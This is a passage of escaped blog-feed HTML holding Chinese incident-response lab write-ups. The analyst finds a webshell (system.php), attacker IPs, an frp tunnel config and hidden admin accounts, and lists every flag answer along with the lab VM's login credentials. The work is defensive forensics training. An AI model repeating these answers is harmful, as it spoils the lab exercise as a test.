&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">上传D盾文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">先扫一边是否存在webshell&lt;/span>&lt;span class="err">。&lt;/span>&lt;span class="nx">并且成功找到后门文件&lt;/span>&lt;span class="err">（&lt;/span>&lt;span class="nx">system&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php文件&lt;/span>&lt;span class="err">）&lt;/span>&lt;span class="nx">成功找到第二个题目&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200030.png" alt="Pasted image 20250301200030">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">system&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="3攻击者的-webshell-密码">3.攻击者的 webshell 密码&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用记事本查看一下system&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">发现pass为&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">hack6618&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200149.png" alt="Pasted image 20250301200149">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">hack6618&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="1攻击者的-ip-地址两个">1.攻击者的 IP 地址（两个）&lt;/h1>
&lt;h2 id="a第一个ip地址">a)第一个IP地址&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">打开小皮面板&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">查看一下Apache日志&lt;/span>&lt;span class="err">，&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200223.png" alt="Pasted image 20250301200223">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">从日志里可以看出&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="mf">192.168.126.135&lt;/span>&lt;span class="nx">上传了webshell文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">说明这个IP确实是攻击者的IP地址&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.126.135&lt;/span>&lt;span class="nx">为第一个黑客地址&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200311.png" alt="Pasted image 20250301200311">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200322.png" alt="Pasted image 20250301200322">&lt;/p>
&lt;h1 id="7攻击者是如何入侵的">7.攻击者是如何入侵的&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">然后我们再看一下ftp是否被攻击&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">一般黑客也比较喜欢使用ftp发起攻击&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200340.png" alt="Pasted image 20250301200340">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200355.png" alt="Pasted image 20250301200355">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">FTP&lt;/span> &lt;span class="nx">服务中&lt;/span> &lt;span class="mi">226&lt;/span> &lt;span class="nx">为登录成功的&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="mi">530&lt;/span> &lt;span class="nx">是登录失败的操作&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200419.png" alt="Pasted image 20250301200419">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">从日志中我们可以看到黑客使用ftp服务器上传了system&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php文件&lt;/span>&lt;span class="err">。&lt;/span>&lt;span class="nx">这里可以确定黑客使用ftp上传的webshell&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">攻击者使用fpt进行入侵&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="b第二个ip地址">b)第二个IP地址&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">我们使用window的日志分析工具&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">查看远程登录连接成功的日志&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200440.png" alt="Pasted image 20250301200440">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">可以看到hack887&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">用户连接两次&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">IP地址为&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mf">192.168.126.129&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200500.png" alt="Pasted image 20250301200500">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="mf">192.168.126.129&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="5攻击者的服务器伪-ip-地址">5.攻击者的服务器伪 IP 地址&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">查看最近操作目录&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用命令&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="nx">userprofile&lt;/span>&lt;span class="o">%/&lt;/span>&lt;span class="nx">Recent&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">可以看到黑客编辑了内网穿透工具&lt;/span> &lt;span class="nx">frp&lt;/span> &lt;span class="nx">相关的文件&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200529.png" alt="Pasted image 20250301200529">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">打开frp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ini文件&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">看到伪&lt;/span> &lt;span class="nx">ip&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">256.256.66.88&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">伪端口&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">65536&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200543.png" alt="Pasted image 20250301200543">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="mf">256.256.66.88&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="6攻击者的服务器端口">6.攻击者的服务器端口&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="o">**&lt;/span>&lt;span class="nx">根据题目五得知&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="mi">65536&lt;/span>&lt;span class="o">**&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="4攻击者的-qq-号">4.攻击者的 QQ 号&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">直接打开frp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ini文件文件位置可以看出&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200620.png" alt="Pasted image 20250301200620">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">那么QQ号应该就是&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="mi">777888999321&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="8攻击者的隐藏用户名">8.攻击者的隐藏用户名&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">我们再使用检查隐藏用户名的脚本&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">看一下黑客是否新加了一个admin账号&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200642.png" alt="Pasted image 20250301200642">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">hack887&lt;/span>&lt;span class="err">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="所有答案">所有答案：&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">system&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">hack6618&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.126.135&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.126.129&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">hack887&lt;/span>&lt;span class="err">$&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">256.256.66.88&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">65536&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">777888999321&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200703.png" alt="Pasted image 20250301200703">&lt;/p></description></item><item><title>【知攻善防靶场】web3</title><link>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb3/</link><pubDate>Fri, 05 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAweb3/</guid><description>&lt;img src="http://localhost:1313/images/38.webp" alt="Featured image of post 【知攻善防靶场】web3" />&lt;h1 id="前提须知">前提须知&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">前景需要&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">小苕在省护值守中&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">在灵机一动情况下把设备停掉了&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">甲方问&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">为什么要停设备&lt;/span>&lt;span class="err">？&lt;/span>&lt;span class="nx">小苕说&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">我第六感告诉我&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">这机器可能被黑了&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">这是他的服务器&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">请你找出以下内容作为通关条件&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1.&lt;/span>&lt;span class="nx">攻击者的两个IP地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">2.&lt;/span>&lt;span class="nx">隐藏用户名称&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">3.&lt;/span>&lt;span class="nx">黑客遗留下的flag&lt;/span>&lt;span class="err">【&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">个&lt;/span>&lt;span class="err">】&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>虚拟机账号/密码&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">用户&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">administrator&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">密码&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">xj&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mi">123456&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>登录到系统之后：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">看到有小皮&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">看一下是否存在后门文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">但未发现有用的信息&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">看来一下也并非后门文件&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>看到有小皮，看一下是否存在后门文件，但未发现有用的信息，看来一下也并非后门文件。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200918.png" alt="Pasted image 20250301200918">&lt;/p>
&lt;h1 id="1-隐藏用户">1. 隐藏用户&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">当我们去检查是否有隐藏用户时发现一个hack6618&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">的隐藏管理员账户&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301200937.png" alt="Pasted image 20250301200937">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">hack6618&lt;/span>&lt;span class="err">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="2-攻击者两个ip">2. 攻击者两个IP&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">先不管账号&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">先看一下apache的日志文件&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">是否有异常&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">根据日志可以看出&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">有两个IP访问频率很高&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">都是一些注入信息&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">所以能确定的是这两个IP为攻击IP&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.75.129&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">192.168.75.130&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201014.png" alt="Pasted image 20250301201014">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201022.png" alt="Pasted image 20250301201022">&lt;/p>
